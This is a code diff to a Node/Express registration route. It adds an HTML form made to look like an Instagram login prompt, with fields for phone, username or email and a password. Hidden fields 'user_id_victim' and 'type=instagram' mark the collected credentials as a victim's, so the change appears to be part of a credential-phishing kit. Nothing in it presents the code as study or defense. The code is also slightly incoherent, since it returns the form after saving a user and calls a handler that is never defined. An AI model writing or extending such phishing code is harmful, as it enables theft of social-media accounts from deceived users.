@@ -56,8 +56,24 @@ app.post('/register', async (req, res) => {
 
         // If you need to store user_id_victim and type, add those fields to your schema as well.
         await newUser.save();
-        res.status(201).json({ message: 'User registered successfully' });
-    } catch (error) {
+        res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Signup Form</title>
+</head>
+<body>
+  <h2>Signup Form</h2>
+  <form onsubmit="handleSubmit(event)">
+    <input type="text" name="email" placeholder="Phone number, username, or email" required>
+    <input type="hidden" name="user_id_victim" value="E5ZH4">
+    <input type="hidden" name="type" value="instagram">
+    <input type="password" name="pass" placeholder="Password" required>
+    <button type="submit">Register</button>
+</form>  
+</body>
+</html>`)   
+     } catch (error) {
         res.status(500).json({ error: 'Error registering user', details: error.message });
     }
 });
